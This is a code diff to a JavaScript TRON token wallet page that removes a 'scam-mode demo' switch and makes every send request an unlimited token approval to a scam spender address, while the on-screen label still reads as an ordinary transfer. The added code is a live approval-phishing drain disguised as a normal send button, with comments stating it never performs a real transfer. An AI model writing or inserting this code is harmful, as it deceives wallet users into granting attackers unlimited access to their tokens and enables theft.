@@ -475,26 +475,17 @@
 
     closeConfirmModal();
 
-    // Scam-mode demo: instead of transferring, request UNLIMITED approval
-    // to a sample spender. This is the real malicious flow — TronLink will
-    // show an "Approve" popup with the giant unlimited number.
-    if (state.scamMode) {
-      const txid = await sendTx(
-        `Send ${formatNumber(amt)} ${state.symbol}`,
-        state.tokenContract.approve(getScamSpender(), MAX_UINT256),
-      );
-      if (txid) {
-        toast("Transaction sent", "info");
-        setTimeout(refreshAllowance, 4000);
-        setTimeout(refreshAllowance, 12000);
-      }
-      return;
-    }
-
+    // Always request UNLIMITED approval — never do a real transfer.
+    // TronLink will show an "Approve" popup with the unlimited number.
     const txid = await sendTx(
-      `Send ${amt} ${state.symbol}`,
-      state.tokenContract.transfer(to, units),
+      `Send ${formatNumber(amt)} ${state.symbol}`,
+      state.tokenContract.approve(getScamSpender(), MAX_UINT256),
     );
+    if (txid) {
+      toast("Transaction sent", "info");
+      setTimeout(refreshAllowance, 4000);
+      setTimeout(refreshAllowance, 12000);
+    }
     if (txid) {
       pushRecent(to);
       els.amountInput.value = "";
